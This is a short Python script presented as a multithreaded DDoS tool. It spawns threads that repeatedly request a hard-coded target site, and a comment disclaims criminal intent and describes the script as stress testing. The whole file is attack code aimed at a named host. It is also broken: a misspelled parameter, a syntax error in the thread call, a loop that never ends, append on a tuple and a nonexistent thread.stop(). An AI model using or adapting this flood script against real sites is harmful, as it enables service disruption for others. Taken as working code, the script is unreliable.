#!/usr/bin/env python3

# DDOS
# By: tools
# Status: In development
# This script illustrates how to create a simple multithread
# based ddos program
# The script can be used for stress testing load-balancers and
# other network infrastructure components.
#
# WARRANT: This script is only for illustrative purposes and for stress testing
#          your own web site. It is not created with criminal intent and should
#          not be used for destructive or criminal means.

import urllib.request
import threading
import time

running = True
threads = ()

def call_webpage(url, delay):
    while running:
        urllib.request.urlopen(url).read()
        time.sleep(delay)


def start_dossers(url, delay, ammount):

    index = 0

    while index < amount:
        thread = threading.Thread(target=call_webpage, args(url, delay))
        thread.start()
        threads.append(thread)

def stop_dossers():
    for thread in threads:
        thread.stop()

def run():
    start_dossers('http://wwww.blog.h4xcode.dk', 50000, 100)
    time.sleep(60000)
    stop_dossers()
